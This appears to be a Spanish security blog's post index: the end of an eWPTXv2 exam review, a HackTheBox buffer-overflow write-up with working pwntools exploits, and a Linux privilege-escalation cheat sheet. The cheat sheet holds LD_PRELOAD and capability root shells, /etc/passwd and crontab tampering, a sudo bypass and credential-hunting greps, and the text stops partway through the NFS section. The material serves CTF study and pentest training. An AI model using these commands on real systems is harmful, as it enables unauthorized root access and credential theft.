SQLMap, usando tokens CSRF. No reportes sólo las vulnerabilidades altas y/o críticas, también contempla hallazgos de criticidad media y/o baja, que por lo común son: clickjacking, ausencia de certificado SSL, etc., no diré más jeje. Podría decirse que se relacionan con la ausencia de implementaciones de seguridad importantes, pero no “críticas”. Estudia la sintaxis de PHP, por lo menos en temáticas de criptografía y procesos de autenticación. No quiero dar spoilers, pero te aconsejo completar los laboratorios de PortSwigger relacionados con PHP Object Injection, lo que abordes en ellos te será de bastante ayuda de cara al examen. PortSwigger es tu mejor amigo de cara al estudio. Si te estancas en el examen, te aconsejo resetear el laboratorio ya que por inestabilidad suele arrojar falsos negativos 🙃 Considerando el punto anterior, si estás seguro de que estás yendo por buen camino, confía en tu corazón y prueba múltiples formas de explotar una vulnerabilidad. Si es necesario, reinicia el laboratorio. ¡Practica! El examen no está regalado.Experiencia Personal 🗿Bueno, ya llegando al final de este post, puedo decirles que este examen no fue la mejor experiencia que he tenido, de hecho la pasé bastante mal ya que reprobé en mi primer intento.Día 0: Me entran las ganas de rendir el examenTodo empieza en Marzo 2023, cuando le digo a mi amigo H4rr1z0n: “mano, voy a sacar el eWPTXv2 en un mes”. Y así fue, sólo que lo saqué en un mes y medio.Para empezar a prepararme agarré todos los recursos de PortSwigger que se relacionaban con las vulnerabilidades que entrarían en el examen.Ya con esto, resolví cada laboratorio, procurando tomar nota de cada uno y entender qué es lo que hacía cada payload que fuese a meter.Otra cosa que me sirvió mucho fue montarme mini aplicaciones vulnerables, a modo de entender cómo se originaban las vulnerabilidades y así darle un poco de más sentido a los payloads en mi cabeza.Ya con esto, el resto lo dejé medio a la vida y me apoyé más de la experiencia previa que había ido adquiriendo en el trabajo y en otros laboratorios que había hecho en HackTheBox y TryHackme (más de 150 máquinas).Día D: Experiencia y resultados del examenEn total, resolviendo el laboratorio en el primer intento me demoré 3 días. En este plazo ya tenía los 3 requisitos mínimos pero no suficientes para aprobar, junto con otro puñado de vulnerabilidades, medias y bajas, para reportar.Ya con eso, me armé un reporte de estilo profesional de unas 100 páginas aprox, con todo lo que este requiere, lo más detallado posible. Hecho esto, lo mandé, esperé dos semanas aprox, miro el correo y me entero de que me habían reprobado 😐En primera instancia no entendía por qué, me sentí super frustrado, confundido y me cuestionaba mucho qué es lo que había hecho mal, o qué me había faltado. Al mirar el feedback de eLearnSecurity, me indicaban que me habían faltado más casos de SQL Injection por reportar.Entonces, arranqué el laboratorio de nuevo, encontré estas SQLi, las documenté y volví a mandar el reporte.Habiendo hecho esto, me quedé un poco enojado, ya que los casos que me faltaron de SQLi, correspondían a casos de la vulnerabilidad en los que no se podía volcar ningún tipo de información del servidor, lo cual me hacía pensar que podían ser fácilmente descartables como falsos positivos, y/o también considerarse como sin sentidos dentro del examen. Pero estoy seguro de que lo digo más por lo emputado que quedé, que por lo que fue 🦆Pero bueno, a fin de cuentas lo medio entendí, hice las pases con eLearn, sobre todo considerando que las vulnerabilidades no eran fáciles de encontrar ni de explotar.Ya con esto, esperé otras 3 semanas y finalmente recibí el típico correo con el mensaje de felicitaciones de eLearnSecurity por haber aprobado el examen 😎 La verdad me sentí feliz y aliviado por finalmente haberlo sacado después de todo lo que había pasado, sin embargo, lamentablemente, igual me quedaron esas bad-vibes, con un sabor agrio en la boca, por el mal rato que pasé. Pero bueeeno, es lo de menos, se peleó, se aprobó y se celebró.¡Muchaaas gracias por leer la review, cualquier cosa estamos al habla por LinkedIn, Twitter o Discord! ❤Happy Hacking 🏴‍☠️" }, { "title": "Jeeves - Pwn Challenge (HTB) ❤", "url": "/posts/Jeeves-HackTheBox-Pwn/", "categories": "linux, binary exploitation, htb", "tags": "linux, pwn, htb, 64-bit", "date": "2023-09-04 00:00:00 -0300", "snippet": "Este es un reto de pwning el cual implica explotar una vulnerabilidad Buffer Overflow en un binario de 64 bits. El objetivo principal es sobrescribir el valor de un registro de memoria en específico, el cual se emplea en una condición dentro del programa; la cual si resulta ser verdadera, provocará que este imprima la flag.Como se observa a continuación, el binario recibe un input del usuario, el cual es impreso en el output resultante de la ejecución:Al analizar el código Assembler se identifican dos instrucciones importantes en la función main.Primeramente se asigna el valor 0xdeadc0d3 al registro rbp-4 , a través de la instrucción MOV.0x00005555555551f5 &amp;lt;+12&amp;gt;: mov DWORD PTR [rbp-0x4],0xdeadc0d3Posterior a esto, dicho valor es sometido a un condicional, a través de una instrucción CMP, de comparación, con el valor 0x1337bab3.Al observar el código fuente, reverseado con Ghidra, se puede entender mucho mejor cómo funciona el programa.Como se visualiza en imagen, el valor de la variable target_variable es sometido a un condicional. Si dicho valor es igual a 0x1337bab3, el programa imprimirá el contenido del archivo flag.txt, caso contrario no lo hará y sólo terminará la ejecución:Es importante mencionar que en el código reverseado se identifica que el programa recibe el input del usuario a través de la función gets, la cual es vulnerable a ataques de desbordamiento de buffer, de acuerdo a su documentación:Sabiendo esto, se procede a debuggear el binario, utilizando la herramienta gdb-gef.Previo a arrancar, se debe crear un archivo flag.txt, de prueba, debido a que el programa lee el contenido de este para obtener el valor de la flag:Hecho esto, se procede a abrir el binario con gdb-gef, donde se establece un breakpoint en la instrucción de memoria, en la cual se realiza la comparación del valor 0x1337bab3 con el valor almacenado en el registro rbp-0x4:0x0000555555555236 &amp;lt;+77&amp;gt;: cmp DWORD PTR [rbp-0x4],0x1337bab3Al ejecutar el programa, con el breakpoint en el condicional, se logra visualizar que el valor almacenado en el registro rbp-4, corresponde a 0xdeadc0d3:A modo de prueba se modifica el valor de dicho registro de memoria por 0x1337bab3, con el objetivo de que el resultado de la condición sea verdadero:Como se mostró en la imagen anterior, cuando el resultado de la condicional es verdadero, el programa imprime la flag, almacenada en el archivo flag.txt.Sin embargo, para lograr el desafío de HTB no podemos usar gdb, debemos lograrlo directamente a través de un Buffer Overflow.Para esto, primeramente podemos identificar que se configura el input del usuario, el cual como límite debe ser una cadena de 44 bytes:char user_name [44];int flag_content;void *flag_length;int target_variable;Si metemos más caracteres de los que soporta el valor de la variable, el buffer se sobrescribe al momento de llamar a la función gets, lo cual causa que el programa no termine su ejecución de manera exitosa:Sabiendo esto, se crea una cadena de 100 bytes con la herramienta pattern create, de gdb, la cual se inyecta en el input para detectar el offset, que corresponde a todo el junk previo a meter para sobrescribir el valor almacenado en rbp-4:Como se puede ver, luego de inyectar dicha entrada de caracteres, se detecta que el offset es 60:De esta manera, lo que se puede concluir hasta ahora, es que tenemos que introducir 60 caracteres antes de sobrescribir el valor de rbp-4.De esta forma, a modo de validar la sobreescritura de rbp-4 se crea la siguiente cadena, la cual son 60 As y 6 Bs:┌──(sha16㉿offs3c)-[~]└─$ python3 -c &quot;print(&#39;\\x41&#39;*60+&#39;\\x42&#39;*6)&quot;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBPosterior a la inyección de la cadena creada, se determina que el offset es correcto, dado que el valor de rbp-4 es BBBBBB:Dado esto, se procede a armar el siguiente exploit en Python3, el cual se encarga de inyectar el valor en el registro rbp-4:#!/usr/bin/python3from pwn import context, process, p64if __name__ == &#39;__main__&#39;: # Set program context context.update(arch=&#39;amd64&#39;, os=&#39;linux&#39;) elf = process(&#39;./jeeves&#39;) # BoF offset = 60 junk = b&#39;\\x41&#39; * offset rbp_4 = p64(0x1337bab3) payload = junk + rbp_4 + b&#39;\\n\\r&#39; # Send payload elf.sendline(payload) elf.interactive()Al ejecutar el exploit, se observa que la flag es obtenida correctamente:Sabiendo que el exploit funciona, ahora este puede ser adaptado a una versión remota para obtener el flag de HackTheBox y completar el reto correctamente:#!/usr/bin/python3from pwn import p64from socket import socketif __name__ == &#39;__main__&#39;: # Connection Data host = &#39;206.189.121.78&#39; port = 31129 # BoF (payload) offset = 60 junk = b&#39;\\x41&#39; * offset rbp_4 = p64(0x1337bab3) payload = junk + rbp_4 + b&#39;\\n\\r&#39; with socket() as s: s.connect((host, port)) s.send(payload) print(s.recv(4096)) print(s.recv(4096))Al ejecutar el exploit, se obtiene con éxito la flag del desafío:De forma aparte, me gustaría mostrarles cómo con la librería de pwntools también pueden crear su propio exploit, un tanto más elegante:#!/usr/bin/python3from pwn import remote, p64, successfrom socket import socketif __name__ == &#39;__main__&#39;: # Connection Data host = &#39;206.189.121.78&#39; port = 31129 # BoF (payload) offset = 60 junk = b&#39;\\x41&#39; * offset rbp_4 = p64(0x1337bab3) payload = junk + rbp_4 + b&#39;\\n\\r&#39; # Remote Connection connection = remote(host, port) connection.sendline(payload) connection.recvuntil(b&#39;Here\\&#39;s a small gift:&#39;) flag = connection.recv(4096) success(b&#39;HTB Flag:&#39; + flag)Al ejecutarlo la flag es obtenida a través de un output mucho más limpio:Eso es todo, espero que le haya gustado y servido mucho este post para aprender algunos conceptos básicos de binary exploitation. La verdad es una temática en la que recién me estoy adentrando y compartirles esto me sirve mucho para retroalimentar estos conceptos.Cualquier duda, consulta, corrección, etc., saben que me pueden contactar en LinkedIn o Twitter 👾Happy Hacking 🏴‍☠️" }, { "title": "Linux Privilege Escalation ❤", "url": "/posts/Linux-Privilege-Escalation-Basics/", "categories": "linux, privesc", "tags": "linux, cheat-sheet, privesc", "date": "2022-09-29 00:00:00 -0300", "snippet": "Estas son mis notas del curso de The CyberMentor, Linux Privilege Escalation for Beginners, el cual recomiendo encarecidamente a todas las personas que se están recién iniciando en el área del pentesting, red team, CTFs, etc.Para todos aquellos que ya tengan un tiempo en el área, créanme que será un excelente repaso de conceptos básicos…God Level Resources 💯Linux Privilege Escalation - HackTricksPrivilege Escalation - Linux · Total OSCP GuidePayloadsAllTheThings/Linux - Privilege Escalation.md at master · swisskyrepo/PayloadsAllTheThingsBasic Linux Privilege Escalation - g0tmi1kTCM-Course-Resources/Linux-Privilege-Escalation-Resources: Compilation of Resources for TCM’s Linux Privilege Escalation courseSystem EnumerationEnumeración de información importante del sistema: versión de sistema operativo y kernel, componentes, CPU, variables de entorno, procesos y subprocesos asociados a usuarios/daemons.# Operating System &amp;amp; Kernel Informationuname -alsb_release -acat /proc/versioncat /etc/issuelscpucat /etc/os-release# Check Environment Variablesenvexport# Check mountsdf -hfindmntfindmnt -lfindmnt -Dfindmnt -s# Installed Dependencies -&amp;gt; Check versionsdpkg -l# Process &amp;amp; Subprocessps auxps -fauxps -eo uid,user,pid,cmdps faux | grep rootUser EnumerationRecopilación de información importante acerca de los usuarios y grupos del sistema, archivos y directorios, privilegios SUDO.# User &amp;amp; Groupswhoamiid# Check Users Resourcesls -la /home/ls -la /home/&amp;lt;user&amp;gt;# Check SUDO privilegessudo -l # Users &amp;amp; Daemons cat /etc/passwd# Check if you can escalate with this formsu -Networking EnumerationInformación acerca de la red en la que se encuentra el servidor, interfaces de red, conexiones locales, puertos internos y externos, enumeración de equipos en la red vía ARP.# Local Interfaces &amp;amp; Network Informationifconfigip arouteip routeip neighhostname -Icat /etc/hosts# Local connections (TCP &amp;amp; UDP)netstat -natnetstat -ano# Hosts via ARP Scanarp -aarp-scan -I &amp;lt;network-interface&amp;gt; -l Password HuntingBúsqueda recursiva de credenciales hardcodeadas en el sistema de archivos del sistema operativo.# Looking for hardcoded credentialsgrep -riE &quot;passwd|password|pass|creds|credentials|dbconnect|connection&quot; / 2&amp;gt;/dev/nullgrep -rnwieE --color=always &quot;passwd|password|pass|creds|credentials|dbconnect|connection&quot; / 2&amp;gt;/dev/nullgrep -ri &quot;passord&quot; / 2&amp;gt;/dev/nullgrep -rnwie --color=always &quot;PASSWORD&quot; / 2&amp;gt;/dev/nullgrep -rnwieE --color=always &quot;PASSWORD=|PASS=&quot; / 2&amp;gt;/dev/null# Looking Password Fileslocate keylocate id_rsalocate credentials locate passwordwhereis passwordwhereis credentials# Looking Credentials in Environment Variablesenv | grep -iE &#39;pass|password&#39;export | grep -iE &#39;pass|password&#39;# Look for configuration files (eg: wp-config.php)locate config# Find SSH Filesfind / -name id_rsa 2&amp;gt;/dev/nullfind / -name id_rsa.pub 2&amp;gt;/dev/nullfind / -name authorized_keys 2&amp;gt;/dev/nullfind / -name known_hosts 2&amp;gt;/dev/null# Always check history commands userhistorycat /home/&amp;lt;user&amp;gt;/.bash_historyAutomated Enumeration ToolsThis tools are very useful to locate possible attack vectors for privilege escalation: PEASS-ng/linPEAS at master · carlospolop/PEASS-ng diego-treitos/linux-smart-enumeration: Linux enumeration tool for pentesting and CTFs with verbosity levels rebootuser/LinEnum: Scripted Local Linux Enumeration &amp;amp; Privilege Escalation Checks mzet-/linux-exploit-suggester: Linux privilege escalation auditing tool sleventyeleven/linuxprivchecker: linuxprivchecker.py – a Linux Privilege Escalation Check ScriptKernel Exploits¿Qué es el Kernel?Es el componente principal de un sistema operativo que tiene control de todo.Su rol más importante es facilitar la comunicación e interacción entre los distintos componentes de una computadora, abarcando desde el hardware hasta el software, permitiendo que estos funcionen en conjunto correctamente.Common Linux Kernel ExploitsEste es un repositorio con los exploits de Kernel más comunes en sistemas operativos GNU/Linux.Un buen punto a tener en cuenta siempre, es que si la versión del Kernel es antigua, 4.8.3 hacia abajo, probablemente es vulnerable a DirtyCow. Por lo tanto, si tienes un servidor con un Kernel Linux 2.X / 3.X, date por seguro que hay una vulnerabilidad DirtyCow.Linux Kernel Exploits: https://github.com/lucyoa/kernel-exploitsLinux Exploit SuggesterEs una herramienta que nos permite enumerar vectores de escalación de privilegios a través de exploits para componentes vulnerables del sistema operativo, o del mismo kernel../linux-exploit-suggester.sh Other Exploitsly4k/PwnKit: Self-contained exploit for CVE-2021-4034 - Pkexec Local Privilege Escalationbriskets/CVE-2021-3493: Ubuntu OverlayFS Local PrivescPasswords &amp;amp; File PermissionsSi tenemos privilegios de escritura en los archivos /etc/passwd o /etc/shadow, tenemos una vulnerabilidad misconfiguration que nos permitirá cambiar las contraseñas de los usuarios y escalar privilegios en el servidor.root@tryit-sharing:~# ls -l /etc/{passwd,shadow} -rw-r--rw- 1 root root 1491 Sep 24 00:06 /etc/passwd -rw-r--rw- 1 root shadow 780 Sep 24 00:06 /etc/shadowLo suyo es generar un hash de tipo crypt, o bcrypt, y remplazarlo en los campos de contraseña en cualquiera de los dos archivos (siempre que podamos escribir en ellos). Para generar nuestra contraseña cifrada posemos utilizar:# Algoritmo DES (crypt)openssl passwd &amp;lt;new-password&amp;gt;# Algoritmo sha-512 (crypt)mkpasswd &amp;lt;new-password&amp;gt;Para editar un archivo tienes que utilizar un editor de texto el cual, como su mismo nombre lo indica, te permitirá modificar el contenido del fichero. Entre los más conocidos tienes: nano, vim, micro y nvim.Para el archivo /etc/passwd sería remplazar la x por el hash generado:# Contenido del archivo originalroot:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin...[REDACTED]# Debería quedar así luego de modificarlo...root:jKw6eSezZulQU:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin...[REDACTED]En el caso del fichero /etc/shadow sería remplazar el asterisco (*), o el hash que se encuentre, por la contraseña cifrada que hemos creado:# Contenido del archivo originalroot:*:19258:0:99999:7::: daemon:*:19258:0:99999:7::: bin:*:19258:0:99999:7::: sys:*:19258:0:99999:7::: sync:*:19258:0:99999:7:::...[REDACTE]# Debería quedar así luego de modificarlo...root:jKw6eSezZulQU:19258:0:99999:7::: daemon:*:19258:0:99999:7::: bin:*:19258:0:99999:7::: sys:*:19258:0:99999:7::: sync:*:19258:0:99999:7:::...[REDACTE]Luego de reemplazar el archivo sólo habría que autenticarnos con el usuario e indicar la contraseña que establecimos en el archivo (obviamente su valor real, no el hash 😅):su &amp;lt;user&amp;gt;Si tienes dudas sobre la explotación te recomiendo mirar este video que subí hace algún tiempo a YouTube: https://youtu.be/eksxwYF8OCQOtro archivo que es susceptible a escalación de privilegios mediante permisos de escritura es el /etc/sudoers. Para esto bastaría con añadir la siguiente línea en el mismo:&amp;lt;user&amp;gt; ALL=(ALL:ALL) ALLAñadiendo esto podremos ejecutar cualquier comando con el usuario root a partir del programa sudo.Cualquiera de las opciones que se presentan a continuación servirá para entablar una sesión con el usuario root:sudo susudo /bin/bashsudo -u root /bin/bashsudo /bin/shsudo -u root /bin/shSSH Keys MisconfigurationCuando un host posee servicios SSH podemos buscar ciertos misconfiguration que nos podría permitir pivotar de usuario en el sistema, o bien, directamente escalar privilegios.Para verificar esto, siempre es importante que chequemos: Si tenemos privilegios de escritura en un archivo authorized_keys, ya sea del usuario root u otro, podemos autenticarnos con el mismo mediante el servicio SSH. Para esto debemos modificarlo, colocar nuestra clave pública dentro del mismo y autenticarnos con nuestra clave privada indicando el usuario. Lo otro sería enumerar archivos con claves ID RSA para probar autenticarnos como otro usuario en el servidor, ya sea efectuando movimiento lateral o vertical (es importante checar si es que existen backups).Abusing SUDO PrivilegesEs posible abusar de distintos binarios del sistema operativo cuando se pueden ejecutar en el contexto de otro usuario mediante SUDO, o privilegios SUID (que serán explicados más adelante).Para esto puedes checar el sitio GTFOBins donde se describen las distintas formas que existen para abusar de los mismos y explotarlos: https://gtfobins.github.io/Por otra parte puede checar algunas hojas de trucos donde se describen formas comunes de escalar privilegios mediante SUDO: Abusing SUDO (Linux Privilege Escalation) - Touhid’s BlogPrivilege Escalation vía SUDO + LD_PRELOADA través de la variable de entorno LD_PRELOAD se pueden especificar los binarios de las bibliotecas compartidas, las cuales son cargadas en memoria antes de que un binario sea ejecutado. Estas serán ejecutada antes de la ejecución del programa real que se invocó. De esta manera, si un usuario es capaz de modificar dicha variable de entorno, será capaz de utilizarla para escalar privilegios en el sistema.Para esto lo primero que debemos hacer es checar si tenemos la capacidad de modificar la variable de entorno por medio del comando sudo -l.Si en el output del comando visualizamos env_keep+=LD_PRELOAD, es porque podemos explotar la vulnerabilidad.Para realizarlo, bastaría con computar un binario que ejecute lo siguiente: por una parte eliminar el valor actual de la variable LD_PRELOAD, establecer el UID y GID en 0, o sea el del usuario root y, para finalizar, que la instrucción a ejecutar sea lanzar una shell /bin/bash:#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;sys/types.h&amp;gt;#include &amp;lt;stdlib.h&amp;gt;void _init(){ unsetenv(&quot;LD_PRELOAD&quot;); setgid(0); setuid(0); system(&quot;/bin/bash&quot;);}Este archivo debe ser compilado para obtener el binario como tal. Para ello podemos ejecutar la siguiente instrucción, utilizando el compilador gcc:gcc -fPIC -shared -o &amp;lt;binary-name&amp;gt;.so &amp;lt;payload-name&amp;gt;.c -nostartfiles# Examplegcc -fPIC -shared -o shell.so shell.c -nostartfilesDe esta manera al ejecutar SUDO, indicando el nuevo valor de la variable de entorno LD_PRELOAD, ejecutaremos la /bin/bash que nosotros definimos en el binario:sudo LD_PRELOAD=&amp;lt;path&amp;gt;/&amp;lt;binary-name&amp;gt;.so &amp;lt;binary-sudo&amp;gt;# Examplesudo LD_PRELOAD=/home/sha-16/shell.so /usr/bin/whoamiSudo 1.8.27 - Security BypassEl año 2019 se encontró una forma de evadir la denegación de ejecutar un comando con root mediante sudo. Para checar esto se podía ejecutar sudo -l, el cual debía mostrar la siguiente línea en el output:&amp;lt;user&amp;gt; ALL=(ALL,!root) /bin/bash# Examplesha-16 ALL=(ALL,!root) /bin/bashBásicamente esta configuración indica que puedes ejecutar el comando /bin/bash, por medio de sudo, con cualquier usuario, excepto con root.Entonces para evadir dicha medida, y lograr ejecutar el comando con el usuario root de igual forma, se podía indicar la siguiente sentencia y escalar privilegios en el servidor:sudo -u#-1 /bin/bashVulnerabilidad en ExploitDB: sudo 1.8.27 - Security Bypass - Linux local ExploitSudo Version &amp;gt; 1.8.26 (**CVE-2019-18634**)Es una vulnerabilidad de SUDO se presenta cuando la configuración pwfeedfack se encuentra habilitado en el archivo /etc/sudoers. Gracias a esto los usuarios con privilegios SUDO pueden explotar un desbordamiento de buffer e inyectar instrucciones en el contexto del otro usuario por medio del programa ejecutado.Para explotar la vulnerabilidad podemos utilizar el siguiente exploit: https://github.com/saleemrashid/sudo-cve-2019-18634Dado que es un archivo escrito en C, debemos compilarlo para generar el binario de la siguiente manera:gcc -o exploit exploit.cUna vez compilado, quedaría solo ejecutarlo en el sistema vulnerable:./exploitTryHackMe Lab to exploit this vuln: TryHackMe - Sudo Buffer OverflowSUID PermissionsLos permisos SUID son privilegios que nos permiten ejecutar un archivo o binario en el contexto del usuario propietario del mismo. Esto significa que si tenemos un binario con permisos SUID y el propietario es root, al ejecutarlo lo estaremos haciendo en el contexto del usuario root y no con el que tenemos nuestra sesión actual.Al ser así, existen varias formas de aprovecharlos para encontrar vectores de ataque que nos pueden permitir escalar privilegios en el servidor, o pivotar de usuario en el sistema.Estas las puedes encontrar detalladas en la plataforma GTFOBins.Para enumerar archivos, o binarios, con permisos SUID, podemos ejecutar cualquiera de las dos opciones que se presentan a continuación:find / -perm -4000 2&amp;gt;/dev/nullfind / -perm -u=s -type f 2&amp;gt;/dev/null # You can look their privilegesfind / -perm -4000 -ls 2&amp;gt;/dev/nullLo suyo es checar cada binario para saber si es que pueden ser una vía potencial de escalación de privilegios.Habrán veces en las que vamos a tener en frente binarios con permisos SUID que no conozcamos y que incluso no se encuentren en GTFOBins.Ante esto tenemos distintas opciones a considerar: Monitorear el comportamiento del binario al ejecutarse con strace (filtra operaciones open, access o No such file…; con esto pondremos buscar las dependencias que utiliza el mismo aplicativo para ver si las podemos “suplantar”). Aplicar técnicas de reversing sobre el binario con ghidra. Enumerar el contenido legible del binario con el comando strings (buscar de credenciales hardcodeadas, dependencias del binario, archivos, etc).La idea de esto es poder encontrar alguna vía potencial para explotar Buffer Overflow, PATH Hijacking o Library Hijacking y lograr escalar privilegios en el servidor.Nginx Privilege Escalation (CVE-2016-1247)Esta es una vulnerabilidad que se presenta sólo en algunas versiones paquetes de Nginx: Anterior a 1.6.2-5+deb8u3 en Debian jessie, Anterior a 1.4.6-1ubuntu3.6 en Ubuntu 14.04 LTS. Anterior a 1.10.0-0ubuntu0.16.04.3 en Ubuntu 16.04 LTS. Anterior a 1.10.1-0ubuntu1.1 en Ubuntu 16.10.La vulnerabilidad es generada a partir de una configuración incorrecta de permisos en los logs de Nginx que permite a un usuario, dueño del servidor web (www-data), crear un enlace simbólico que apunte hacia una biblioteca compartida creada y controlada por el atacante para aprovechar el misconfiguration y ser ejecutada una vez se arranque, o reinicie, el servidor web.Para checar las versiones de los paquetes de Nginx instalados en el servidor puedes ejecutar el siguiente comando:dpkg -l | grep -i &quot;nginx&quot;Es de suma importancia checar que tenemos los respectivos privilegios asignados de manera incorrecta en los logs del servidor web:$ ls -ld /var/log/nginx/*-rw-r----- 1 www-data adm 0 Nov 12 22:31 /var/log/nginx/access.log-rw-r--r-- 1 root root 0 Nov 12 22:47 /var/log/nginx/error.logDe todas maneras puedes explotar esto más rápido, ejecutando el script que se adjunta en el siguiente enlace: Nginx-Exploit-Deb-Root-PrivEsc-CVE-2016-1247.$ chmod +x nginxed-root.sh$ /nginxed-root.sh /var/log/nginx/error.logAbusing CapabilitiesSe podría decir que son privilegios del usuario root fragmentados que se establecen para ejecutar binarios, o archivos, en determinados contextos puntuales. En si evitan que el usuario que los ejecuta asuma la identidad de root. Permiten asignar permisos de una forma mucho más selectiva, lo cual de por si lo hace mucho más seguro que los permisos SUID.Las capabilities tal como su nombre lo indican son ciertas capacidades que le podemos brindar a un binario/archivo para ser ejecutado, en un determinado contexto, como el usuario root, sin abarcar la totalidad del proceso.Sin embargo, existen ciertos misconfigurations que nos pueden permitir abusar de algunas capabilities para escalar privilegios en el servidor.Antes de ahondar más en los misconfigurations, es importante mencionar que existen 3 flags para asignar capabilities: P (Permitted), E (Effective) e I (Inheritable): Permitted (p): Este flag establece que el binario puede invocar esa capabilitie al momento de ser ejecutado. Effective (e): Este flag permite representar todo el conjunto efectivo de capabilities que el proceso está utilizando. Con esto se evita emitir llamadas especiales en el sistema. Inhertitable (i): Este flag permite determinar si el proceso al que se asignan los privilegios es extensible o no a procesos hijos.Si no entendiste la descripción anterior, te dejo el siguiente fragmento que a lo mejor te puede ayudar a entenderlo mejor: “En esencia, asignando a un fichero una capability con flags E y P se puede decir que el proceso derivado en la ejecución tendrá esa capability sin hacerla extensible a los posibles procesos hijos.” - Incibe-CertBueno, una vez tenemos una buena idea de lo que son las capabilities, podemos ir a los comandos.Primeramente, si quieres enumerar capabilities, lo suyo sería utilizar al comando getcap de la siguiente forma:getcap -r / 2&amp;gt;/dev/nullDe esta manera, realizaremos una búsqueda recursiva de binarios y archivos con capabilties en el sistema operativo.Una capabilitie muy común de aprovechar es: CAP_SETUID, la cual nos permite ejecutar el binario en el contexto de otro usuario a partir del UID que establezcamos al momento de ejecutarlo.Por ejemplo: Tenemos al intérprete de python3 con esta capabilitie como se muestra a continuación:/usr/bin/python3 = cap_setuid+epEsto es un misconfiguration y nos permitirá escalar privilegios, ya que con python3 podemos ejecutar código a nivel de sistema, definiendo el UID del usuario que deseemos impersonar.Para escalar privilegios podemos ejecutar el siguiente comando:/usr/bin/python3 -c &quot;import os; os.setuid(0); os.system(&#39;/bin/bash&#39;);&quot;La ejecución de dicho comando importará el módulo de sistema os, que nos permitirá establecer el UID 0, del usuario root, y luego de esto, se ejecutará una orden de sistema que sería una shell /bin/bash en el contexto del usuario definido en la función setuid a partir de su identificador.Si tienes capabilties asignadas en tu servidor, puedes revisar el recurso GTFOBins donde se muestran distintas formas de abusar de algunas de estas para escalar privilegios.Cron JobsLas tareas cron, tal como su nombre lo indican, son procesos que se ejecutan en el sistema de forma programada.Estas son ejecutadas en segundo plano por el usuario asignado para ello.Existen distintas formas de configurar tareas cron, una es a través del programa crontab, otra es por medio del archivo /etc/crontab, también se pueden programar mediante los archivos contenidos dentro de los directorios y subdirectorios de /etc/cron/.La estructura de una tarea cron es la siguiente:# Example: # Cron: Execute backups with root user on every friday of month at 00:000 0 * * 4 root /root/backups/backup.shEs importante mencionar que existen temporizadores preestablecidos que permiten programar la ejecución de las tareas con palabras: @reboot: Se ejecuta sólo una vez (nada más iniciarse el equipo). @yearly: Se ejecuta sólo una vez al año: *0 0 1 1 **. @monthly: Se ejecuta una vez al mes y el primer día a las 12 de la noche: *0 0 1 * **. @weekly: Todas las semanas, el primer minuto de la primer hora de la semana: 0 0 * * 0. @daily: Todos los días a las 12 de la noche: *0 0 * * **. @midnight: Tiene el mismo efecto que el anterior. @hourly: Todas las horas durante su primer minuto: *0 * * * **.Si aún no sabes bien cómo leer cron jobs, te recomiendo utilizar este recurso que te permitirá traducirlas y conocer sus respectivos significados: Crontab.guruDe esta forma, si de seguridad hablamos, podemos abusar de cron jobs si: Tenemos permisos de escritura, o alguna forma de modificar, archivos de Cron (ej: /etc/crontab). Tenemos privilegios de escritura en los archivos o binarios que se ejecutan a partir de los cron jobs. Tenemos la capacidad de intervenir en los procesos que se ejecutan con Cron (ej: podemos modificar un archivo que se ejecuta a partir de la ejecución de un binario con cron). Tenemos la capacidad de modificar algún archivo crontab de otro usuario.Por ejemplo, si tenemos permisos de escritura en el archivo /etc/crontab lo suyo sería la siguiente secuencia de comandos para escalar privilegios:# Create a malicious file$ echo &#39;cp /bin/bash /tmp/bash &amp;amp;&amp;amp; chmod 4755 /tmp/bash&#39; &amp;gt; /tmp/privesc.sh $ chmod +x /tmp/privesc.sh# Add evil cron job to /etc/crontab$ echo &#39;* * * * * root /tmp/privesc.sh&#39; &amp;gt;&amp;gt; /etc/crontab# Wait a minute and you will get root by executing the next command/tmp/bash -p Process MonitoringUna buena técnica de enumeración es la monitorización de procesos con la herramienta PspyPodemos descargar uno de los releases, de acuerdo a la arquitectura de nuestro sistema operativo, y ejecutarlo de la siguiente manera para comenzar a ver los procesos que se ejecutan en tiempo real:# x86chmod +x pspy32./pspy32# x86_x64chmod +x pspy64./pspy64 Una alternativa para esto, puede ser crear un script en bash usando la herramienta ps:#!/bin/basholdProcess=$(ps -eo command);while true;do newProcess=$(ps -eo command); diff &amp;lt;(echo &quot;$oldPrcess&quot;) &amp;lt;(echo &quot;$newProcess&quot;) | grep &quot;[\\&amp;gt;\\&amp;lt;]&quot; | grep -vE &quot;procmon.sh|command&quot;; oldProcess=$newProcess; sleep 4;doneLa idea de la monitorización de procesos es recopilar información sobre los archivos o binarios que se están ejecutando en segundo plano, qué usuario lo está haciendo y cada cuánto.Dado esto, es importante checar si es que tenemos algún tipo de privilegio importante sobre los ejecutables de las tareas, checar si podemos alterar el contenido de los mismos, o incluso verificar si es que podemos concatenar su explotación con otra vulnerabilidad.Privilege Escalation via NFS Root SquashingNetwork File System (NFS) es un protocolo de comunicación, usado comúnmente para compartir archivos a través de la red. Este protocolo al ser configurado de forma incorrecta, podría permitir que los usuarios locales del servidor escalen privilegios dentro del mismo.Identificación de recursos compartidos vía NFSPor defecto NFS se ejecuta en el puerto 2049, el cual puede ser asequible de forma remota (si es que así se configura) a través del comando showmount:showmount -e &amp;lt;ip&amp;gt;De la misma manera, las carpetas compartidas pueden ser enumeradas localmente a través del archivo /etc/exports:cat /etc/exportsNFS VulnerablesCuando un recurso compartido tiene habilitada la opción no_root_squash, significa que dentro de los recursos compartidos se podrán realizar cambios utilizando máximos privilegios de root.De esta manera debemos considerar dos cosas para escalar privilegios: El recurso tiene habilitada la opción no_root_squash en el fichero /etc/exports. El recurso es asequible de forma remota desde otros dispositivos de la red.Esto último nos permitirá crear una montura del mismo en nuestro servidor local de atacantes.De esta manera, lo primero que debemos realizar es una montura del 